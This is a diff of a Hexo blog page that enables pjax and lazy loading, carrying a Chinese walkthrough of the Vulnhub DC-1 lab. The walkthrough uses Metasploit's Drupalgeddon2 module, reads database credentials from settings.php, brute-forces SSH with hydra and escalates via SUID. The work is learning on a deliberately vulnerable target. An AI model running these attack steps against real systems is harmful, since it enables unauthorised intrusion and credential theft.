@@ -29,8 +29,8 @@ color="220,220,220" opacity='0.7' zIndex="-2" count="200" src="//cdn.bootcss.com
     <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.1/source/css/font-awesome.min.css">
     <script id="hexo-configurations">
     let KEEP = window.KEEP || {};
-    KEEP.hexo_config = {"hostname":"example.com","root":"/","language":"cn"};
-    KEEP.theme_config = {"toc":{"enable":true,"number":true,"expand_all":false,"init_open":false},"style":{"primary_color":"#33CCCC","avatar":"/images/head.png","favicon":"/images/title.jpg","article_img_align":"left","left_side_width":"260px","content_max_width":"920px","hover":{"shadow":true,"scale":false},"first_screen":{"enable":false,"background_img":"/images/Watch.png","description":"Life is but a Dream"},"scroll":{"progress_bar":{"enable":false},"percent":{"enable":false}}},"local_search":{"enable":true,"trigger":"auto","unescape":false,"preload":true},"code_copy":{"enable":true,"style":"default"},"pjax":{"enable":false},"lazyload":{"enable":false},"version":"3.4.1"};
+    KEEP.hexo_config = {"hostname":"example.com","root":"/","language":"cn","path":"search.xml"};
+    KEEP.theme_config = {"toc":{"enable":true,"number":true,"expand_all":false,"init_open":false},"style":{"primary_color":"#33CCCC","avatar":"/images/head.png","favicon":"/images/title.jpg","article_img_align":"left","left_side_width":"260px","content_max_width":"920px","hover":{"shadow":true,"scale":false},"first_screen":{"enable":false,"background_img":"/images/Watch.png","description":"Life is but a Dream"},"scroll":{"progress_bar":{"enable":false},"percent":{"enable":false}}},"local_search":{"enable":true,"trigger":"auto","unescape":false,"preload":true},"code_copy":{"enable":true,"style":"default"},"pjax":{"enable":true},"lazyload":{"enable":true},"version":"3.4.1"};
     KEEP.language_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"};
   </script>
 
@@ -42,6 +42,11 @@ color="220,220,220" opacity='0.7' zIndex="-2" count="200" src="//cdn.bootcss.com
 <div class="progress-bar-container">
     
 
+    
+        <span class="pjax-progress-bar"></span>
+        <span class="pjax-progress-icon">
+            <i class="fas fa-circle-notch fa-spin"></i>
+        </span>
     
 </div>
 
@@ -201,17 +206,17 @@ color="220,220,220" opacity='0.7' zIndex="-2" count="200" src="//cdn.bootcss.com
 <p>所以才想写点东西，记录一下</p>
 <p><strong>1.下载</strong></p>
 <p>地址<a class="link" target="_blank" rel="noopener" href="https://www.vulnhub.com/entry/dc-1-1,292/">https://www.vulnhub.com/entry/dc-1-1,292/<i class="fas fa-external-link-alt"></i></a></p>
-<img src="1503868-20191008182912843-755043193.png" alt>
+<img lazyload src="/images/loading.svg" data-src="Vulnhub DC-1靶机渗透学习/1503868-20191008182912843-755043193.png" alt>
 
 <p> </p>
 <p> 建议用镜像，快一点</p>
 <p>使用Oracle VM VirtualBox打开</p>
-<img src="1503868-20191008183234206-2052555030.png" alt>
+<img lazyload src="/images/loading.svg" data-src="Vulnhub DC-1靶机渗透学习/1503868-20191008183234206-2052555030.png" alt>
 
 <p> </p>
 <p><strong>2.开始</strong></p>
 <p>打开虚拟机后。提示需要账号密码</p>
-<img src="1503868-20191008183826342-1988344385.png" alt>
+<img lazyload src="/images/loading.svg" data-src="Vulnhub DC-1靶机渗透学习/1503868-20191008183826342-1988344385.png" alt>
 
 <p> </p>
 <p> </p>
@@ -219,39 +224,39 @@ color="220,220,220" opacity='0.7' zIndex="-2" count="200" src="//cdn.bootcss.com
 <p>于是打开kali，vmware的网络配置使用桥接网络，用</p>
 <p>arp-scan -l</p>
 <p>扫描</p>
-<img src="1503868-20191008184304149-1087683089.png" alt>
+<img lazyload src="/images/loading.svg" data-src="Vulnhub DC-1靶机渗透学习/1503868-20191008184304149-1087683089.png" alt>
 
 <p>其中的 Cadmus Computer Systems即为我们的目标，打开前面的192.168.124.76，如图</p>
-<img src="1503868-20191008184554890-500432642.png" alt>
+<img lazyload src="/images/loading.svg" data-src="Vulnhub DC-1靶机渗透学习/1503868-20191008184554890-500432642.png" alt>
 
 <p> </p>
 <p> 这里推荐一个chrome插件，叫wappalyzer，这个可以检测网站的信息，cms，框架，服务器等等，非常棒。通过这个插件，可以得知这个网站使用的是drupalCMS</p>
 <p>在msf中查找对应的信息</p>
 <p>search drupal</p>
-<img src="1503868-20191008190211244-935277838.png" alt>
+<img lazyload src="/images/loading.svg" data-src="Vulnhub DC-1靶机渗透学习/1503868-20191008190211244-935277838.png" alt>
 
 <p> </p>
 <p> 用第5个，先</p>
 <p>set rhosts 192.168.124.76</p>
 <p>然后use exploit/unix/webapp/drupal_drupalgeddon2 </p>
 <p>再exploit</p>
-<p>如图<img src="1503868-20191008191225507-208094555.png" alt> </p>
+<p>如图<img lazyload src="/images/loading.svg" data-src="Vulnhub DC-1靶机渗透学习/1503868-20191008191225507-208094555.png" alt> </p>
 <p>当提示session1 open时，则已经成功进入了</p>
 <p>执行命令shell命令获得shell</p>
 <p>输入ls</p>
-<img src="1503868-20191008191416951-158428866.png" alt>
+<img lazyload src="/images/loading.svg" data-src="Vulnhub DC-1靶机渗透学习/1503868-20191008191416951-158428866.png" alt>
 
 <p> </p>
 <p>发现有给flag1.txt的文件，打开看一下 </p>
 <p>cat flag1.txt</p>
-<img src="1503868-20191008192002902-1429591048.png" alt>
+<img lazyload src="/images/loading.svg" data-src="Vulnhub DC-1靶机渗透学习/1503868-20191008192002902-1429591048.png" alt>
 
 <p> </p>
 <p> 翻译翻译，每一个好的CMS都需要一个配置文件，你也一样。</p>
 <p>找到这个CMS的配置文件（google）</p>
 <p>cd sites/default</p>
 <p>cat settings.php</p>
-<img src="1503868-20191008192805685-1373517764.png" alt>
+<img lazyload src="/images/loading.svg" data-src="Vulnhub DC-1靶机渗透学习/1503868-20191008192805685-1373517764.png" alt>
 
 <p> </p>
 <p> 这边看到了flag2</p>
@@ -264,40 +269,40 @@ color="220,220,220" opacity='0.7' zIndex="-2" count="200" src="//cdn.bootcss.com
 <p>dbuser R0ck3t</p>
 <p>直到现在还没有拿到登陆的账号密码</p>
 <p>这边进入/etc/passwd看一下</p>
-<img src="1503868-20191008193732496-156656781.png" alt>
+<img lazyload src="/images/loading.svg" data-src="Vulnhub DC-1靶机渗透学习/1503868-20191008193732496-156656781.png" alt>
 
 <p> </p>
 <p> 发现有个叫flag4的账号，如何用john +hydra试着暴力破解一下</p>
 <p>hydra是kali自带的，john需要自己安装，这个网上去找教程，这里不放出来了</p>
 <p>hydra -l flag4 -P /root/john-1.8.0/run/password.lst ssh://192.168.124.76</p>
-<img src="1503868-20191008194614411-358316779.png" alt>
+<img lazyload src="/images/loading.svg" data-src="Vulnhub DC-1靶机渗透学习/1503868-20191008194614411-358316779.png" alt>
 
 <p> </p>
 <p> 然后密码就出来了。。。。。</p>
 <p>在vm virutalBox上登陆一下</p>
-<img src="1503868-20191008194906324-1422923090.png" alt>
+<img lazyload src="/images/loading.svg" data-src="Vulnhub DC-1靶机渗透学习/1503868-20191008194906324-1422923090.png" alt>
 
 <p> </p>
 <p> </p>
 <p>也可以用kalissh远程登陆（推荐用这个，vmbox太tm蛋疼了）</p>
-<p>ssh <a class="link" href="mailto:&#x66;&#x6c;&#x61;&#x67;&#x34;&#x40;&#x31;&#57;&#x32;&#46;&#x31;&#54;&#x38;&#x2e;&#x31;&#50;&#52;&#x2e;&#55;&#x36;">&#x66;&#x6c;&#x61;&#x67;&#x34;&#x40;&#x31;&#57;&#x32;&#46;&#x31;&#54;&#x38;&#x2e;&#x31;&#50;&#52;&#x2e;&#55;&#x36;<i class="fas fa-external-link-alt"></i></a></p>
-<img src="1503868-20191008194735795-928890603.png" alt>
+<p>ssh <a class="link" href="mailto:&#102;&#x6c;&#97;&#103;&#52;&#x40;&#x31;&#57;&#50;&#46;&#x31;&#54;&#x38;&#46;&#x31;&#x32;&#x34;&#46;&#55;&#54;">&#102;&#x6c;&#97;&#103;&#52;&#x40;&#x31;&#57;&#50;&#46;&#x31;&#54;&#x38;&#46;&#x31;&#x32;&#x34;&#46;&#55;&#54;<i class="fas fa-external-link-alt"></i></a></p>
+<img lazyload src="/images/loading.svg" data-src="Vulnhub DC-1靶机渗透学习/1503868-20191008194735795-928890603.png" alt>
 
 <p> </p>
 <p> 然后登陆mysql</p>
 <p>mysql -u dbuser -p </p>
-<img src="1503868-20191008195714318-1593804041.png" alt>
+<img lazyload src="/images/loading.svg" data-src="Vulnhub DC-1靶机渗透学习/1503868-20191008195714318-1593804041.png" alt>
 
 <p> </p>
 <p> 然后开始找东西</p>
 <p>show databases；</p>
 <p>show tables</p>
 <p>发现有一个叫users的表</p>
-<img src="1503868-20191008200349120-1961374716.png" alt>
+<img lazyload src="/images/loading.svg" data-src="Vulnhub DC-1靶机渗透学习/1503868-20191008200349120-1961374716.png" alt>
 
 <p> </p>
 <p> 打开，发现</p>
-<img src="1503868-20191008200418127-1504200673.png" alt>
+<img lazyload src="/images/loading.svg" data-src="Vulnhub DC-1靶机渗透学习/1503868-20191008200418127-1504200673.png" alt>
 
 <p> </p>
 <p> 再百度一波，如何重置drupal的密码</p>
@@ -305,14 +310,14 @@ color="220,220,220" opacity='0.7' zIndex="-2" count="200" src="//cdn.bootcss.com
 <p>然后用password登陆，这边这个加密方法我还没搞懂</p>
 <p> </p>
 <p>之后就可以登录之前的网站(192.168.124.76)了</p>
-<img src="1503868-20191010092937917-1985895515.png" alt>
+<img lazyload src="/images/loading.svg" data-src="Vulnhub DC-1靶机渗透学习/1503868-20191010092937917-1985895515.png" alt>
 
 <p> </p>
 <p> 登陆后，在网站里扒拉来，扒拉去，在左上的content里看到一个叫flag3的玩意</p>
-<p> <img src="1503868-20191010093624422-1257690405.png" alt></p>
+<p> <img lazyload src="/images/loading.svg" data-src="Vulnhub DC-1靶机渗透学习/1503868-20191010093624422-1257690405.png" alt></p>
 <p> </p>
 <p> 发现这是一个提示</p>
-<img src="1503868-20191010093650497-209099064.png" alt>
+<img lazyload src="/images/loading.svg" data-src="Vulnhub DC-1靶机渗透学习/1503868-20191010093650497-209099064.png" alt>
 
 <p> </p>
 <p> Special PERMS will help FIND the passwd - but you’ll need to -exec that command to work out how to get what’s in the shadow.</p>
@@ -327,7 +332,7 @@ color="220,220,220" opacity='0.7' zIndex="-2" count="200" src="//cdn.bootcss.com
 <p>cd ../..</p>
 <p>cd /root</p>
 <p>cat thefinalflag.txt</p>
-<img src="1503868-20191010125936186-717095048.png" alt>
+<img lazyload src="/images/loading.svg" data-src="Vulnhub DC-1靶机渗透学习/1503868-20191010125936186-717095048.png" alt>
 
 <p> </p>
 <p> 然后就算是告一段落了</p>
@@ -336,7 +341,7 @@ color="220,220,220" opacity='0.7' zIndex="-2" count="200" src="//cdn.bootcss.com
 <p>做完这个感觉自己真的很菜，在此总结一下这个过程中了解到的，学到的，以及还不懂的知识</p>
 <p>1.arp-scan -l 　　用来扫描局域网内的主机。（参考<a class="link" target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_43221560/article/details/90550294">https://blog.csdn.net/weixin_43221560/article/details/90550294<i class="fas fa-external-link-alt"></i></a>）</p>
 <p>2.用 msf5来reach drupal寻找漏洞，配置并使用这些漏洞（一知半解，还得好好学习），</p>
-<p>3.ssh远程连接，如在渗透过程中使用到的  ssh <a class="link" href="mailto:&#x66;&#x6c;&#97;&#x67;&#52;&#x40;&#x31;&#57;&#x32;&#46;&#x31;&#54;&#56;&#46;&#x31;&#x32;&#x34;&#x2e;&#x37;&#x36;">&#x66;&#x6c;&#97;&#x67;&#52;&#x40;&#x31;&#57;&#x32;&#46;&#x31;&#54;&#56;&#46;&#x31;&#x32;&#x34;&#x2e;&#x37;&#x36;<i class="fas fa-external-link-alt"></i></a>。挺方便的</p>
+<p>3.ssh远程连接，如在渗透过程中使用到的  ssh <a class="link" href="mailto:&#x66;&#108;&#97;&#103;&#x34;&#x40;&#x31;&#x39;&#50;&#46;&#x31;&#x36;&#x38;&#46;&#49;&#50;&#52;&#46;&#55;&#54;">&#x66;&#108;&#97;&#103;&#x34;&#x40;&#x31;&#x39;&#50;&#46;&#x31;&#x36;&#x38;&#46;&#49;&#50;&#52;&#46;&#55;&#54;<i class="fas fa-external-link-alt"></i></a>。挺方便的</p>
 <p>4.john the Ripper +hydra 爆破，（john下载安装参考<a class="link" target="_blank" rel="noopener" href="https://blog.csdn.net/Romanticduan/article/details/81233479">https://blog.csdn.net/Romanticduan/article/details/81233479<i class="fas fa-external-link-alt"></i></a>，使用参考<a class="link" target="_blank" rel="noopener" href="https://blog.csdn.net/qq_36119192/article/details/83373895">https://blog.csdn.net/qq_36119192/article/details/83373895<i class="fas fa-external-link-alt"></i></a>）</p>
 <p>hydra -l flag4 -P /root/john-1.8.0/run/password.lst ssh://192.168.124.76（也是一知半解，同样得学）</p>
 <p>5.suid提权</p>
@@ -403,10 +408,10 @@ color="220,220,220" opacity='0.7' zIndex="-2" count="200" src="//cdn.bootcss.com
         
             
     <div class="valine-container">
-        <script 
+        <script data-pjax
                 src="//cdn.jsdelivr.net/npm/valine@latest/dist/Valine.min.js"></script>
         <div id="vcomments"></div>
-        <script >
+        <script data-pjax>
             function loadValine() {
                 new Valine({
                     el: '#vcomments',
@@ -452,7 +457,7 @@ color="220,220,220" opacity='0.7' zIndex="-2" count="200" src="//cdn.bootcss.com
                 }, 2000);
             }
 
-            if ('false') {
+            if ('true') {
                 const loadValineTimeout = setTimeout(() => {
                     loadValine();
                     clearTimeout(loadValineTimeout);
@@ -486,12 +491,10 @@ color="220,220,220" opacity='0.7' zIndex="-2" count="200" src="//cdn.bootcss.com
         <div class="copyright-info info-item">
             &copy;
             
-              <span>2020</span>&nbsp;-&nbsp;
-            
             2021&nbsp;<i class="fas fa-heart icon-animate"></i>&nbsp;<a href="/">This_is_Y</a>
         </div>
         
-            <script async  src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+            <script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
             <div class="website-count info-item">
                 
                     <span id="busuanzi_container_site_uv">
@@ -642,12 +645,46 @@ color="220,220,220" opacity='0.7' zIndex="-2" count="200" src="//cdn.bootcss.com
 
 
 
+    <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.1/source/js/lazyload.js"></script>
 
-<div class="post-scripts">
+
+<div class="post-scripts pjax">
     
         <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.1/source/js/left-side-toggle.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.1/source/js/libs/anime.min.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.1/source/js/toc.js"></script>
     
 </div>
+
+
+    <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.1/source/js/libs/pjax.min.js"></script>
+<script>
+    window.addEventListener('DOMContentLoaded', () => {
+        const pjax = new Pjax({
+            selectors: [
+                'head title',
+                '.page-container',
+                '.pjax'
+            ],
+            history: true,
+            debug: false,
+            cacheBust: false,
+            timeout: 0,
+            analytics: false,
+            currentUrlFullReload: false,
+            scrollRestoration: false,
+            // scrollTo: true,
+        });
+
+        document.addEventListener('pjax:send', () => {
+            KEEP.utils.pjaxProgressBarStart();
+        });
+
+        document.addEventListener('pjax:complete', () => {
+            KEEP.utils.pjaxProgressBarEnd();
+            pjax.executeScripts(document.querySelectorAll('script[data-pjax], .pjax script'));
+            KEEP.refresh();
+        });
+    });
+</script>
 
 
 
